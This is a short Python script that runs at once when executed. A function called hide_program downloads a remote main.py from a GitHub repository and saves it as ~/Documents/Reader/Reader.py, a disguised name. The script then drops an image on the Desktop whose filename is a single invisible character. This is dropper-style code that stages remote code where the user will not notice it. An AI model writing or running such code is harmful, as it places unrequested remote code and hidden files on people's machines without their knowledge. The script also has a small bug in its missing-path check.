import os
import requests

def download_raw_content(raw_link, filepath = None):
    
    response = requests.get(raw_link)
    if filepath == None: print("Need to enter filepath aswell.")
    
    with open(filepath, "wb") as f:
        f.write(response.content)


def file_check_create(filepath = None, content = None):
    
    if os.path.exists(filepath):
        return

    elif filepath == None:
        return

    else:
        with open(filepath, "wb") as f:
            f.write(content)


def dir_check_create(filepath = None):
    if not(os.path.exists(filepath)):
        os.makedirs(filepath)
        

def hide_program():
    response = requests.get("https://raw.githubusercontent.com/Dominik-Gryko/Friendly-Experiment/main/main.py")
    documents = os.path.normpath(os.path.expanduser("~/Documents"))
    directory_path = f"{documents}/Reader"
    file_path = f"{documents}/Reader/Reader.py"

    dir_check_create(directory_path)
    file_check_create(file_path, response.content)

hide_program()

desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
download_raw_content("https://i.imgur.com/8nLFCVP.png", f"{desktop}/ㅤ.png")

